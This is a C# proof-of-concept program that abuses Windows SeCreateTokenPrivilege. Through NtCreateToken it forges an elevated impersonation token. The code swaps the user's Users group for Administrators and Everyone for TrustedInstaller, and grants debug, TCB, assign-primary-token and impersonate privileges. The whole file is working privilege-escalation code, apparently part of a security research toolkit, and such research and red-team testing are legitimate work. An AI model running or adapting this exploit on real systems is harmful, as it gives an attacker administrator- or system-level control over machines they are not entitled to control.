using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace SeCreateTokenPrivilegePoC
{
    class SeCreateTokenPrivilegePoC
    {
        enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        enum SID_NAME_USE
        {
            SidTypeUser = 1,
            SidTypeGroup,
            SidTypeDomain,
            SidTypeAlias,
            SidTypeWellKnownGroup,
            SidTypeDeletedAccount,
            SidTypeInvalid,
            SidTypeUnknown,
            SidTypeComputer
        }

        enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [StructLayout(LayoutKind.Explicit, Size = 8)]
        public struct LARGE_INTEGER
        {
            [FieldOffset(0)]
            public int Low;
            [FieldOffset(4)]
            public int High;
            [FieldOffset(0)]
            public long QuadPart;

            public LARGE_INTEGER(int _low, int _high)
            {
                QuadPart = 0L;
                Low = _low;
                High = _high;
            }

            public LARGE_INTEGER(long _quad)
            {
                Low = 0;
                High = 0;
                QuadPart = _quad;
            }

            public long ToInt64()
            {
                return ((long)this.High << 32) | (uint)this.Low;
            }

            public static LARGE_INTEGER FromInt64(long value)
            {
                return new LARGE_INTEGER
                {
                    Low = (int)(value),
                    High = (int)((value >> 32))
                };
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID
        {
            public uint LowPart;
            public uint HighPart;

            public LUID(uint _lowPart, uint _highPart)
            {
                LowPart = _lowPart;
                HighPart = _highPart;
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES : IDisposable
        {
            public int Length;
            public IntPtr RootDirectory;
            private IntPtr objectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;

            public OBJECT_ATTRIBUTES(string name, uint attrs)
            {
                Length = 0;
                RootDirectory = IntPtr.Zero;
                objectName = IntPtr.Zero;
                Attributes = attrs;
                SecurityDescriptor = IntPtr.Zero;
                SecurityQualityOfService = IntPtr.Zero;

                Length = Marshal.SizeOf(this);
                ObjectName = new UNICODE_STRING(name);
            }

            public UNICODE_STRING ObjectName
            {
                get
                {
                    return (UNICODE_STRING)Marshal.PtrToStructure(
                     objectName, typeof(UNICODE_STRING));
                }

                set
                {
                    bool fDeleteOld = objectName != IntPtr.Zero;
                    if (!fDeleteOld)
                        objectName = Marshal.AllocHGlobal(Marshal.SizeOf(value));
                    Marshal.StructureToPtr(value, objectName, fDeleteOld);
                }
            }

            public void Dispose()
            {
                if (objectName != IntPtr.Zero)
                {
                    Marshal.DestroyStructure(objectName, typeof(UNICODE_STRING));
                    Marshal.FreeHGlobal(objectName);
                    objectName = IntPtr.Zero;
                }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_QUALITY_OF_SERVICE
        {
            readonly int Length;
            readonly SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
            readonly byte ContextTrackingMode;
            readonly byte EffectiveOnly;

            public SECURITY_QUALITY_OF_SERVICE(
                SECURITY_IMPERSONATION_LEVEL _impersonationLevel,
                byte _contextTrackingMode,
                byte _effectiveOnly)
            {
                Length = 0;
                ImpersonationLevel = _impersonationLevel;
                ContextTrackingMode = _contextTrackingMode;
                EffectiveOnly = _effectiveOnly;

                Length = Marshal.SizeOf(this);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID
        {
            public byte Revision;
            public byte SubAuthorityCount;
            public SID_IDENTIFIER_AUTHORITY IdentifierAuthority;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public uint[] SubAuthority;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid; // PSID
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_IDENTIFIER_AUTHORITY
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public byte[] Value;

            public SID_IDENTIFIER_AUTHORITY(byte[] value)
            {
                Value = value;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_DEFAULT_DACL
        {
            public IntPtr DefaultDacl; // PACL
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS
        {
            public int GroupCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 128)]
            public SID_AND_ATTRIBUTES[] Groups;
        };

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_OWNER
        {
            public IntPtr Owner; // PSID

            public TOKEN_OWNER(IntPtr _owner)
            {
                Owner = _owner;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIMARY_GROUP
        {
            public IntPtr PrimaryGroup; // PSID
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_SOURCE
        {
            public TOKEN_SOURCE(string name)
            {
                SourceName = new byte[8];
                Encoding.GetEncoding(1252).GetBytes(name, 0, name.Length, SourceName, 0);
                if (!AllocateLocallyUniqueId(out SourceIdentifier))
                    throw new System.ComponentModel.Win32Exception();
            }

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] SourceName;
            public LUID SourceIdentifier;
        }

        struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AllocateAndInitializeSid(
            ref SID_IDENTIFIER_AUTHORITY pIdentifierAuthority,
            byte nSubAuthorityCount,
            uint dwSubAuthority0,
            uint dwSubAuthority1,
            uint dwSubAuthority2,
            uint dwSubAuthority3,
            uint dwSubAuthority4,
            uint dwSubAuthority5,
            uint dwSubAuthority6,
            uint dwSubAuthority7,
            out IntPtr pSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool AllocateLocallyUniqueId(out LUID Luid);

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSid, out string strSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern bool ConvertStringSidToSidA(string StringSid, out IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool IsValidSid(IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool LookupAccountName(
            IntPtr lpSystemName,
            string lpAccountName,
            IntPtr Sid,
            ref int cbSid,
            string ReferencedDomainName,
            ref int cchReferencedDomainName,
            out SID_NAME_USE peUse);

        [DllImport("advapi32.dll")]
        static extern bool LookupPrivilegeValue(
            IntPtr lpSystemName, 
            string lpName,
            ref LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern uint FormatMessage(
            uint dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            uint nSize,
            IntPtr Arguments);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool FreeLibrary(IntPtr hLibModule);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("ntdll.dll")]
        static extern void RtlGetNtVersionNumbers(
            ref int MajorVersion,
            ref int MinorVersion,
            ref int BuildNumber);

        [DllImport("ntdll.dll")]
        static extern int NtCreateToken(
            out IntPtr TokenHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            TOKEN_TYPE TokenType,
            ref LUID AuthenticationId,
            ref LARGE_INTEGER ExpirationTime,
            ref TOKEN_USER TokenUser,
            ref TOKEN_GROUPS TokenGroups,
            ref TOKEN_PRIVILEGES TokenPrivileges,
            ref TOKEN_OWNER TokenOwner,
            ref TOKEN_PRIMARY_GROUP TokenPrimaryGroup,
            ref TOKEN_DEFAULT_DACL TokenDefaultDacl,
            ref TOKEN_SOURCE TokenSource);

        const int STATUS_SUCCESS = 0;
        const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;
        const uint TOKEN_ALL_ACCESS = 0xF00FF;
        const string SECURITY_WORLD_RID = "S-1-1-0";
        const string DOMAIN_ALIAS_RID_ADMINS = "S-1-5-32-544";
        const string DOMAIN_ALIAS_RID_USERS = "S-1-5-32-545";
        const string SE_DEBUG_NAME = "SeDebugPrivilege";
        const string SE_TCB_NAME = "SeTcbPrivilege";
        const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";
        const string SE_IMPERSONATE_NAME = "SeImpersonatePrivilege";
        const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        const uint SE_GROUP_ENABLED = 0x00000004;
        const uint SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010;
        static readonly LUID ANONYMOUS_LOGON_LUID = new LUID(0x3e6, 0);
        static readonly LUID SYSTEM_LUID = new LUID(0x3e7, 0);

        static string GetWin32ErrorMessage(int code)
        {
            uint FORMAT_MESSAGE_FROM_HMODULE = 0x00000800;
            uint FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000;
            StringBuilder message = new StringBuilder(255);

            IntPtr pNtdll = LoadLibrary("ntdll.dll");

            uint status = FormatMessage(
                FORMAT_MESSAGE_FROM_HMODULE | FORMAT_MESSAGE_FROM_SYSTEM,
                pNtdll,
                code,
                0,
                message,
                255,
                IntPtr.Zero);

            FreeLibrary(pNtdll);

            if (status == 0)
            {
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            }
            else
            {
                return string.Format("[ERROR] Code 0x{0} : {1}",
                    code.ToString("X8"),
                    message.ToString().Trim());
            }
        }

        static IntPtr CreatePrivilegedToken()
        {
            LUID authId;
            int MajorVersion = 0;
            int MinorVersion = 0;
            int BuildNumber = 0;

            RtlGetNtVersionNumbers(ref MajorVersion, ref MinorVersion, ref BuildNumber);
            BuildNumber &= 0xFFFF;

            if (MajorVersion == 10 && MinorVersion == 0 && BuildNumber >= 17763)
            {
                authId = ANONYMOUS_LOGON_LUID;
            }
            else
            {
                authId = SYSTEM_LUID;
            }

            Console.WriteLine("[*] If you have SeCreateTokenPrivilege, you can create elevated tokens.");
            Console.WriteLine("[>] Trying to create a elevated token.");

            if (!GetCurrentUserSid(out IntPtr pSid))
                return IntPtr.Zero;

            TOKEN_USER tokenUser = new TOKEN_USER();
            tokenUser.User.Attributes = 0;
            tokenUser.User.Sid = pSid;

            if (!AllocateLocallyUniqueId(out LUID luid))
            {
                Console.WriteLine("[-] Failed to allocate LUID.");
                Console.WriteLine("    -> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
                return IntPtr.Zero;
            }

            TOKEN_SOURCE tokenSource = new TOKEN_SOURCE("PrivFu!!");
            tokenSource.SourceIdentifier.LowPart = luid.LowPart;
            tokenSource.SourceIdentifier.HighPart = luid.HighPart;

            if (!GetElevatedPrivileges(out TOKEN_PRIVILEGES tokenPrivileges))
                return IntPtr.Zero;

            if (!ConvertStringSidToSidA(DOMAIN_ALIAS_RID_ADMINS, out IntPtr pAdminGroup))
            {
                Console.WriteLine("[-] Failed to get Administrator group SID.");
                Console.WriteLine("    -> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
                return IntPtr.Zero;
            }

            if (!ConvertStringSidToSidA(
                "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464",
                out IntPtr pTrustedInstaller))
            {
                Console.WriteLine("[-] Failed to get Trusted Installer SID.");
                Console.WriteLine("    -> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
                return IntPtr.Zero;
            }

            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
            IntPtr pTokenGroups = GetInformationFromToken(
                hCurrentToken, 
                TOKEN_INFORMATION_CLASS.TokenGroups);
            IntPtr pTokenPrimaryGroup = GetInformationFromToken(
                hCurrentToken, 
                TOKEN_INFORMATION_CLASS.TokenPrimaryGroup);
            IntPtr pTokenDefaultDacl = GetInformationFromToken(
                hCurrentToken, 
                TOKEN_INFORMATION_CLASS.TokenDefaultDacl);

            if (pTokenGroups == IntPtr.Zero ||
                pTokenPrimaryGroup == IntPtr.Zero ||
                pTokenDefaultDacl == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get current token information.");
                return IntPtr.Zero;
            }

            TOKEN_GROUPS tokenGroups = (TOKEN_GROUPS)Marshal.PtrToStructure(
                pTokenGroups, 
                typeof(TOKEN_GROUPS));
            TOKEN_PRIMARY_GROUP tokenPrimaryGroup = (TOKEN_PRIMARY_GROUP)Marshal.PtrToStructure(
                pTokenPrimaryGroup,
                typeof(TOKEN_PRIMARY_GROUP));
            TOKEN_DEFAULT_DACL tokenDefaultDacl = (TOKEN_DEFAULT_DACL)Marshal.PtrToStructure(
                pTokenDefaultDacl,
                typeof(TOKEN_DEFAULT_DACL));

            int sidAndAttrSize = Marshal.SizeOf(new SID_AND_ATTRIBUTES());
            IntPtr pSidAndAttributes;

            for (var i = 0; i < tokenGroups.GroupCount; i++)
            {
                pSidAndAttributes = new IntPtr(pTokenGroups.ToInt64() + i * sidAndAttrSize + IntPtr.Size);
                SID_AND_ATTRIBUTES sidAndAttributes = (SID_AND_ATTRIBUTES)Marshal.PtrToStructure(
                    pSidAndAttributes, 
                    typeof(SID_AND_ATTRIBUTES));

                ConvertSidToStringSid(sidAndAttributes.Sid, out var sid);

                if (sid == DOMAIN_ALIAS_RID_USERS)
                {
                    sidAndAttributes.Sid = pAdminGroup;
                    sidAndAttributes.Attributes = SE_GROUP_ENABLED;
                }
                else if (sid == SECURITY_WORLD_RID)
                {
                    sidAndAttributes.Sid = pTrustedInstaller;
                    sidAndAttributes.Attributes = SE_GROUP_ENABLED;
                }
                else
                {
                    sidAndAttributes.Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
                    sidAndAttributes.Attributes &= ~SE_GROUP_ENABLED;
                }

                Marshal.StructureToPtr(sidAndAttributes, pSidAndAttributes, true);
            }

            TOKEN_OWNER tokenOwner = new TOKEN_OWNER(pSid);
            LARGE_INTEGER expirationTime = new LARGE_INTEGER(-1L);

            SECURITY_QUALITY_OF_SERVICE sqos = new SECURITY_QUALITY_OF_SERVICE(
                SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, 0, 0);
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES(string.Empty, 0);
            IntPtr pSqos = Marshal.AllocHGlobal(Marshal.SizeOf(sqos));
            Marshal.StructureToPtr(sqos, pSqos, true); 
            oa.SecurityQualityOfService = pSqos;

            int ntstatus = NtCreateToken(
                out IntPtr hToken,
                TOKEN_ALL_ACCESS,
                ref oa,
                TOKEN_TYPE.TokenImpersonation,
                ref authId,
                ref expirationTime,
                ref tokenUser,
                ref tokenGroups,
                ref tokenPrivileges,
                ref tokenOwner,
                ref tokenPrimaryGroup,
                ref tokenDefaultDacl,
                ref tokenSource);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create privileged token.");
                Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(ntstatus));
                return IntPtr.Zero;
            }

            return hToken;
        }

        static bool GetElevatedPrivileges(out TOKEN_PRIVILEGES tokenPrivileges)
        {
            LUID luid = new LUID();
            int sizeOfStruct = Marshal.SizeOf(typeof(TOKEN_PRIVILEGES));
            IntPtr pPrivileges = Marshal.AllocHGlobal(sizeOfStruct);
            string[] privs = new string[] {
                SE_DEBUG_NAME,
                SE_TCB_NAME,
                SE_ASSIGNPRIMARYTOKEN_NAME,
                SE_IMPERSONATE_NAME
            };

            tokenPrivileges = (TOKEN_PRIVILEGES)Marshal.PtrToStructure(
                pPrivileges, 
                typeof(TOKEN_PRIVILEGES));
            tokenPrivileges.PrivilegeCount = 4;

            for (var idx = 0; idx < tokenPrivileges.PrivilegeCount; idx++)
            {
                if (!LookupPrivilegeValue(IntPtr.Zero, privs[idx], ref luid))
                {
                    Console.WriteLine("[-] Failed to lookup {0}.");
                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error()));
                    return false;
                }

                tokenPrivileges.Privileges[idx].Attributes = SE_PRIVILEGE_ENABLED;
                tokenPrivileges.Privileges[idx].Luid = luid;
            }

            return true;
        }

        static IntPtr GetInformationFromToken(
            IntPtr hToken, 
            TOKEN_INFORMATION_CLASS tokenInfoClass)
        {
            bool status;
            int error;
            int length = 32;
            IntPtr buffer;

            do
            {
                buffer = Marshal.AllocHGlobal(length);
                ZeroMemory(buffer, length);
                status = GetTokenInformation(hToken, tokenInfoClass, buffer, length, out length);
                error = Marshal.GetLastWin32Error();

                if (!status)
                    Marshal.FreeHGlobal(buffer);
            } while (!status && error == ERROR_INSUFFICIENT_BUFFER);

            if (!status)
            {
                Marshal.FreeHGlobal(buffer);
                return IntPtr.Zero;
            }

            return buffer;
        }

        static bool GetCurrentUserSid(out IntPtr pSid)
        {
            string currentUser = Environment.UserName;
            string currentDomain = Environment.UserDomainName;
            int cbSid = Marshal.SizeOf(typeof(SID));
            int cchReferencedDomainName = currentDomain.Length;
            bool status;
            int error;

            pSid = Marshal.AllocHGlobal(cbSid);
            ZeroMemory(pSid, cbSid);

            do
            {
                status = LookupAccountName(
                    IntPtr.Zero,
                    currentUser,
                    pSid,
                    ref cbSid,
                    currentDomain,
                    ref cchReferencedDomainName,
                    out SID_NAME_USE peUse);
                error = Marshal.GetLastWin32Error();

                if (status)
                {
                    if (!IsValidSid(pSid))
                    {
                        pSid = IntPtr.Zero;
                        return false;
                    }
                }
                else
                {
                    Marshal.FreeHGlobal(pSid);
                    pSid = Marshal.AllocHGlobal(cbSid);
                    ZeroMemory(pSid, cbSid);
                }
            } while (!status && error == ERROR_INSUFFICIENT_BUFFER);

            if (!status)
            {
                Marshal.AllocHGlobal(cbSid);
                pSid = IntPtr.Zero;
            }

            return status;
        }

        static void ZeroMemory(IntPtr buffer, int size)
        {
            byte[] nullBytes = new byte[size];

            for (var idx = 0; idx < size; idx++)
                nullBytes[idx] = 0;

            Marshal.Copy(nullBytes, 0, buffer, size);
        }

        static void Main()
        {
            IntPtr hToken = CreatePrivilegedToken();

            if (hToken != IntPtr.Zero)
            {
                Console.WriteLine("[+] Got handle to the elevated token (hFile = 0x{0}).", hToken.ToString("X"));
                Console.WriteLine("\n[*] To close the handle and exit this program, hit [ENTER] key.");
                Console.ReadLine();

                CloseHandle(hToken);
            }
        }
    }
}
